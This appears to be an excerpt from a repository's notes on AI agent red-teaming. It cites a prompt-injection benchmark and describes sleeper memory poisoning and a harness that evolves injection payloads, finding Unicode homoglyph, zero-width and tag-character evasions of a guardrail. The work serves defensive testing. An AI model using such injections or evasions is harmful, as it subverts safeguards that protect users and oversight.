- **AgentRedBench** (Dingeto & Leeney, **arXiv:2606.02240**, Jun 2026) — 215 underspecified-authorization scenarios across 24 SaaS integrations, 5 attack types. No-guard attack success **32–81%** across eight models; off-the-shelf open-source guards (Llama Guard, PromptGuard 2) show only partial detection, so a purpose-built guard was introduced. Cited in `hunt-agent-guardrail-evasion`. (NOT "guards detect nothing" — a common mis-summary; the paper reports partial, not zero, detection.)
- **Dynamic / auto red-teaming is the field's direction of travel** — the move from fixed hand-designed injection templates (InjecAgent/AgentDojo/WASP) to LLM-generated, adaptive injections and attacker-agent loops. See AgentRedBench (above) as the verified anchor; related work (PI-Hunter, "Agent Against Agent", AgentDyn) is named but its arXiv IDs are **unverified** — confirm before citing. This is the repo's biggest missing capability (a dynamic red-team harness), tracked as a candidate below.
- **Sleeper / temporally-extended memory poisoning** — surveys describe a planted memory that lies dormant and activates in a later session. Encoded deterministically as `lab/exploits/exploit_memory_sleeper.py`.

### Shipped capability
- **Adaptive red-team harness (`redteam/`)** — evolves injection payloads against a target and scores each with the control-first gate discipline, reporting what landed with its mutation lineage. **Model-optional**: deterministic mutation by default (runs in CI, no key), LLM generator (Ollama) a pluggable opt-in. Proven in-repo: against the lab guardrail it discovers homoglyph / zero-width / Unicode-Tag evasions the static seed misses, with the benign control discriminating (`redteam/test_redteam.py`). This closes the "static templates only" gap the 2026 literature flagged; the LLM path and real-target evidence remain operator-supplied (no frontier key / target in CI).
